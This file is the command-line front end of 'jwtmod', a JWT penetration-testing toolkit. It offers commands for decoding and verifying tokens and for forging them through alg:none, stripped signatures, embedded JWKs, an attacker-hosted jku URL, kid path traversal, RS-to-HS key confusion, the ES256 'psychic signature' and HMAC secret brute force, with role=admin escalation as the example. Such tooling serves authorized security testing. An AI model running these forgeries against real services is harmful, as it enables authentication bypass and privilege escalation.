#!/usr/bin/env python3
"""jwtmod CLI — JWT security testing toolkit.

For authorized security testing only.

Examples:

    python3 cli.py decode <jwt>
    python3 cli.py info <jwt>
    python3 cli.py diff <jwtA> <jwtB>
    python3 cli.py modify <jwt> --set role=admin --remove exp
    python3 cli.py forge none <jwt> --set role=admin
    python3 cli.py forge sign <jwt> --alg HS256 --secret @secret.txt --set role=admin
    python3 cli.py attack jwk-embed <jwt> --set role=admin --out-priv priv.pem
    python3 cli.py attack jku <jwt> --url https://attacker.tld/.well-known/jwks.json
    python3 cli.py attack kid <jwt> --value '../../../dev/null'
    python3 cli.py attack rs-to-hs <jwt> --public-key pub.pem
    python3 cli.py attack strip-sig <jwt>
    python3 cli.py attack psychic-es256 <jwt>
    python3 cli.py verify <jwt> --alg HS256 --secret @secret.txt
    python3 cli.py brute <jwt>

Legacy single-shot form (alg:none alias) still works:

    python3 cli.py <jwt> --set role=admin --remove exp
"""

from __future__ import annotations

import argparse
import json
import sys
from typing import Any, NoReturn

from jwtmod import (
    JWTError,
    b64url_encode,
    decode_jwt,
    diff as diff_tokens,
    info as info_token,
    json_encode,
    sign as sign_jwt,
    verify as verify_jwt,
    forge_none,
    forge_signed,
    forge_jwk_embed,
    forge_jku,
    forge_kid,
    forge_rs_to_hs_confusion,
    forge_strip_signature,
    forge_psychic_es256,
    load_pem,
    default_wordlist_path,
    iter_wordlist,
    try_secrets,
    transform_payload,
)


def _die(msg: str, code: int = 2) -> NoReturn:
    print(f"error: {msg}", file=sys.stderr)
    raise SystemExit(code)


def _parse_set(value: str) -> tuple[str, str]:
    if "=" not in value:
        raise argparse.ArgumentTypeError(f"--set expects key=value, got: {value!r}")
    key, _, raw = value.partition("=")
    if not key:
        raise argparse.ArgumentTypeError("--set key cannot be empty")
    return key, raw


def _load_token(arg_token: str | None) -> str:
    if arg_token and arg_token != "-":
        return arg_token.strip()
    if sys.stdin.isatty():
        _die("no token provided (pass as argument or via stdin)")
    data = sys.stdin.read().strip()
    if not data:
        _die("empty stdin")
    return data


def _load_secret(spec: str | None) -> bytes | None:
    """`@path` reads a file (raw bytes), `0xHEX` decodes hex, else utf-8."""
    if spec is None:
        return None
    if spec.startswith("@"):
        try:
            with open(spec[1:], "rb") as f:
                return f.read()
        except OSError as e:
            _die(f"cannot read secret file: {e}")
    if spec.startswith("0x") or spec.startswith("0X"):
        try:
            return bytes.fromhex(spec[2:])
        except ValueError as e:
            _die(f"invalid hex secret: {e}")
    return spec.encode("utf-8")


def _load_key(path: str | None):
    if path is None:
        return None
    try:
        with open(path, "rb") as f:
            return load_pem(f.read())
    except OSError as e:
        _die(f"cannot read key file: {e}")
    except JWTError as e:
        _die(str(e))


def _load_merge_json(s: str | None, path: str | None) -> dict | None:
    if s and path:
        _die("--merge-json and --merge-json-file are mutually exclusive")
    text: str | None = None
    if s:
        text = s
    elif path:
        try:
            with open(path, "r", encoding="utf-8") as f:
                text = f.read()
        except OSError as e:
            _die(f"cannot read --merge-json-file: {e}")
    if text is None:
        return None
    try:
        obj = json.loads(text)
    except json.JSONDecodeError as e:
        _die(f"--merge-json is not valid JSON: {e}")
    if not isinstance(obj, dict):
        _die("--merge-json must be a JSON object")
    return obj


def _add_payload_flags(p: argparse.ArgumentParser) -> None:
    p.add_argument("--set", dest="sets", action="append", default=[], type=_parse_set,
                   metavar="KEY=VALUE",
                   help="set a claim (JSON-coerced); dotted keys nest. Repeatable.")
    p.add_argument("--remove", dest="removes", action="append", default=[],
                   metavar="KEY", help="remove a claim (dotted); repeatable")
    p.add_argument("--merge-json", dest="merge_json", default=None, metavar="JSON",
                   help="JSON object deep-merged into payload")
    p.add_argument("--merge-json-file", dest="merge_json_file", default=None, metavar="PATH",
                   help="path to JSON file deep-merged into payload")
    p.add_argument("--preset", dest="presets", action="append", default=[], metavar="NAME[=ARG]",
                   help="apply preset: expire | extend-exp=SECS | perma | clear-time | admin[:keys=...]")


def _dump(args, header, payload, token, extra=None) -> int:
    if args.json_out:
        out: dict[str, Any] = {"header": header, "payload": payload, "token": token}
        if extra:
            out["extra"] = extra
        print(json.dumps(out, indent=2, ensure_ascii=False, default=str))
    else:
        print(token)
    return 0


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="jwtmod",
        description="JWT security testing toolkit — for authorized testing only.",
    )
    p.add_argument("--json", dest="json_out", action="store_true",
                   help="print full JSON result instead of just the token")
    sub = p.add_subparsers(dest="cmd")

    # decode
    pd = sub.add_parser("decode", help="pretty-print header/payload/signature")
    pd.add_argument("token", nargs="?")

    # info
    pi = sub.add_parser("info", help="friendly report with warnings")
    pi.add_argument("token", nargs="?")

    # diff
    pdiff = sub.add_parser("diff", help="structured diff between two tokens")
    pdiff.add_argument("token_a")
    pdiff.add_argument("token_b")

    # modify
    pm = sub.add_parser("modify", help="apply claim edits, keep original signature segment placeholder")
    pm.add_argument("token", nargs="?")
    _add_payload_flags(pm)
    pm.add_argument("--keep-header-extras", action="store_true",
                    help="preserve non-alg header fields")

    # forge
    pf = sub.add_parser("forge", help="forge a token")
    fsub = pf.add_subparsers(dest="forge_cmd")

    pfn = fsub.add_parser("none", help="forge an alg:none token")
    pfn.add_argument("token", nargs="?")
    _add_payload_flags(pfn)
    pfn.add_argument("--alg-literal", default="none",
                     help="value to write in the alg header (none, None, NONE, nOnE)")
    pfn.add_argument("--keep-header-extras", action="store_true")
    pfn.add_argument("--no-trailing-dot", action="store_true")

    pfs = fsub.add_parser("sign", help="re-sign with any alg")
    pfs.add_argument("token", nargs="?")
    _add_payload_flags(pfs)
    pfs.add_argument("--alg", required=True)
    pfs.add_argument("--secret", default=None,
                     help="HS* secret (string, @file, or 0xHEX)")
    pfs.add_argument("--key", default=None, help="PEM private key file for RS/PS/ES")
    pfs.add_argument("--kid", default=None)
    pfs.add_argument("--keep-header-extras", action="store_true")

    # attack
    pa = sub.add_parser("attack", help="attack recipes")
    asub = pa.add_subparsers(dest="attack_cmd")

    pae = asub.add_parser("jwk-embed", help="embed generated pub JWK in header")
    pae.add_argument("token", nargs="?")
    _add_payload_flags(pae)
    pae.add_argument("--alg", default="RS256")
    pae.add_argument("--out-priv", default=None, help="write generated private PEM here")

    paj = asub.add_parser("jku", help="set jku to an attacker-controlled URL")
    paj.add_argument("token", nargs="?")
    _add_payload_flags(paj)
    paj.add_argument("--url", required=True)
    paj.add_argument("--alg", default="RS256")
    paj.add_argument("--out-jwks", default=None, help="write JWKS JSON to host at --url")
    paj.add_argument("--out-priv", default=None)

    pak = asub.add_parser("kid", help="inject arbitrary kid, HS-sign")
    pak.add_argument("token", nargs="?")
    _add_payload_flags(pak)
    pak.add_argument("--value", required=True)
    pak.add_argument("--secret", default=None, help="HS secret (default empty)")
    pak.add_argument("--alg", default="HS256")

    par = asub.add_parser("rs-to-hs", help="HS-sign with the verifier's public PEM as secret")
    par.add_argument("token", nargs="?")
    _add_payload_flags(par)
    par.add_argument("--public-key", required=True, help="PEM file with target's public key")
    par.add_argument("--alg", default="HS256")

    pas = asub.add_parser("strip-sig", help="empty-signature variant")
    pas.add_argument("token", nargs="?")
    _add_payload_flags(pas)
    pas.add_argument("--alg-literal", default=None,
                     help="optional rewrite of header alg")
    pas.add_argument("--trailing-dot", action="store_true")

    pap = asub.add_parser("psychic-es256", help="ES256 with r=s=0 'psychic signature'")
    pap.add_argument("token", nargs="?")
    _add_payload_flags(pap)

    # verify
    pv = sub.add_parser("verify", help="verify a token signature")
    pv.add_argument("token", nargs="?")
    pv.add_argument("--alg", required=True)
    pv.add_argument("--secret", default=None)
    pv.add_argument("--key", default=None)

    # brute
    pb = sub.add_parser("brute", help="HS* secret brute force")
    pb.add_argument("token", nargs="?")
    pb.add_argument("--wordlist", default=None)
    pb.add_argument("--alg", default=None)
    pb.add_argument("--max", dest="max_tries", type=int, default=None)

    return p


def _gather(args) -> dict:
    return {
        "sets": args.sets,
        "removes": args.removes,
        "merge_json": _load_merge_json(getattr(args, "merge_json", None),
                                        getattr(args, "merge_json_file", None)),
        "presets": args.presets,
    }


def _run(args) -> int:
    cmd = args.cmd

    if cmd == "decode":
        token = _load_token(args.token)
        header, payload, sig = decode_jwt(token)
        print(json.dumps({"header": header, "payload": payload, "signature": sig},
                         indent=2, ensure_ascii=False))
        return 0

    if cmd == "info":
        token = _load_token(args.token)
        print(json.dumps(info_token(token), indent=2, ensure_ascii=False, default=str))
        return 0

    if cmd == "diff":
        print(json.dumps(diff_tokens(args.token_a, args.token_b),
                         indent=2, ensure_ascii=False, default=str))
        return 0

    if cmd == "modify":
        token = _load_token(args.token)
        header, payload, sig = decode_jwt(token)
        kw = _gather(args)
        new_payload = transform_payload(
            payload, sets=kw["sets"], removes=kw["removes"],
            merge_json=kw["merge_json"], presets=kw["presets"],
        )
        if args.keep_header_extras:
            new_header = dict(header)
        else:
            new_header = {"alg": header.get("alg", "none"), "typ": header.get("typ", "JWT")}
        h = b64url_encode(json_encode(new_header))
        p = b64url_encode(json_encode(new_payload))
        out = f"{h}.{p}.{sig}"
        return _dump(args, new_header, new_payload, out)

    if cmd == "forge":
        kw = _gather(args)
        if args.forge_cmd == "none":
            token = _load_token(args.token)
            nh, np_, nt, extra = forge_none(
                token, **kw,
                alg_literal=args.alg_literal,
                keep_header_extras=args.keep_header_extras,
                trailing_dot=not args.no_trailing_dot,
            )
            return _dump(args, nh, np_, nt, extra)
        if args.forge_cmd == "sign":
            token = _load_token(args.token)
            alg = args.alg
            if alg.startswith("HS"):
                key = _load_secret(args.secret)
                if key is None:
                    _die("--secret required for HS*")
            elif alg == "none":
                key = None
            else:
                key = _load_key(args.key)
                if key is None:
                    _die("--key required for RS/PS/ES")
            nh, np_, nt, extra = forge_signed(
                token, alg=alg, key=key, kid=args.kid,
                keep_header_extras=args.keep_header_extras, **kw,
            )
            return _dump(args, nh, np_, nt, extra)
        _die("forge: missing subcommand (none|sign)")

    if cmd == "attack":
        kw = _gather(args)
        c = args.attack_cmd
        token = _load_token(args.token)
        if c == "jwk-embed":
            nh, np_, nt, extra = forge_jwk_embed(token, alg=args.alg, **kw)
            if args.out_priv:
                with open(args.out_priv, "w") as f:
                    f.write(extra["private_pem"])
            return _dump(args, nh, np_, nt, extra)
        if c == "jku":
            nh, np_, nt, extra = forge_jku(token, jku_url=args.url, alg=args.alg, **kw)
            if args.out_jwks:
                with open(args.out_jwks, "w") as f:
                    f.write(extra["jwks_json"])
            if args.out_priv:
                with open(args.out_priv, "w") as f:
                    f.write(extra["private_pem"])
            return _dump(args, nh, np_, nt, extra)
        if c == "kid":
            secret = _load_secret(args.secret) if args.secret is not None else b""
            nh, np_, nt, extra = forge_kid(token, kid_value=args.value, secret=secret,
                                            alg=args.alg, **kw)
            return _dump(args, nh, np_, nt, extra)
        if c == "rs-to-hs":
            try:
                with open(args.public_key, "rb") as f:
                    pem = f.read()
            except OSError as e:
                _die(f"cannot read --public-key: {e}")
            nh, np_, nt, extra = forge_rs_to_hs_confusion(token, public_pem=pem,
                                                            hs_alg=args.alg, **kw)
            return _dump(args, nh, np_, nt, extra)
        if c == "strip-sig":
            nh, np_, nt, extra = forge_strip_signature(
                token, alg_literal=args.alg_literal,
                trailing_dot=args.trailing_dot, **kw,
            )
            return _dump(args, nh, np_, nt, extra)
        if c == "psychic-es256":
            nh, np_, nt, extra = forge_psychic_es256(token, **kw)
            return _dump(args, nh, np_, nt, extra)
        _die("attack: missing recipe")

    if cmd == "verify":
        token = _load_token(args.token)
        alg = args.alg
        if alg.startswith("HS"):
            key = _load_secret(args.secret)
            if key is None:
                _die("--secret required for HS*")
        elif alg == "none":
            key = None
        else:
            key = _load_key(args.key)
            if key is None:
                _die("--key required for RS/PS/ES")
        ok = verify_jwt(token, alg, key)
        print("valid" if ok else "invalid")
        return 0 if ok else 1

    if cmd == "brute":
        token = _load_token(args.token)
        wl_path = args.wordlist or default_wordlist_path()
        try:
            it = iter_wordlist(wl_path)
        except OSError as e:
            _die(f"cannot read wordlist: {e}")
        def _progress(n):
            print(f"  ...tried {n}", file=sys.stderr)
        found = try_secrets(token, it, alg=args.alg,
                             max_tries=args.max_tries, on_progress=_progress)
        if found is None:
            print("no secret found", file=sys.stderr)
            return 1
        try:
            print(found.decode("utf-8"))
        except UnicodeDecodeError:
            print(found.hex())
        return 0

    _die("no subcommand given (try -h)")


# ---- legacy alg:none alias ----

_KNOWN_CMDS = {"decode", "info", "diff", "modify", "forge", "attack", "verify", "brute", "-h", "--help"}


def main(argv: list[str] | None = None) -> int:
    raw = argv if argv is not None else sys.argv[1:]

    # If the first positional looks like a JWT (or stdin), and no subcommand is given,
    # behave as the legacy alg:none forger so old usages keep working.
    use_legacy = False
    if raw:
        first = raw[0]
        if first not in _KNOWN_CMDS and not first.startswith("--"):
            if first.count(".") in (1, 2) or len(first) > 60:
                use_legacy = True
    elif not sys.stdin.isatty():
        use_legacy = True

    if use_legacy:
        return _legacy_main(raw)

    parser = build_parser()
    args = parser.parse_args(raw)
    try:
        return _run(args)
    except JWTError as e:
        _die(str(e))


def _legacy_main(argv: list[str]) -> int:
    """Old `python3 cli.py <jwt> --set ... [--decode-only|--json]` form."""
    p = argparse.ArgumentParser(prog="jwtmod (legacy alg:none)")
    p.add_argument("token", nargs="?")
    _add_payload_flags(p)
    p.add_argument("--keep-header-extras", action="store_true")
    p.add_argument("--no-trailing-dot", action="store_true")
    p.add_argument("--decode-only", action="store_true")
    p.add_argument("--json", dest="json_out", action="store_true")
    args = p.parse_args(argv)
    token = _load_token(args.token)
    try:
        if args.decode_only:
            header, payload, sig = decode_jwt(token)
            print(json.dumps({"header": header, "payload": payload, "signature": sig},
                             indent=2, ensure_ascii=False))
            return 0
        kw = {
            "sets": args.sets,
            "removes": args.removes,
            "merge_json": _load_merge_json(args.merge_json, args.merge_json_file),
            "presets": args.presets,
        }
        nh, np_, nt, _extra = forge_none(
            token, **kw,
            keep_header_extras=args.keep_header_extras,
            trailing_dot=not args.no_trailing_dot,
        )
    except JWTError as e:
        _die(str(e))
    if args.json_out:
        print(json.dumps({"header": nh, "payload": np_, "token": nt}, indent=2, ensure_ascii=False))
    else:
        print(nt)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
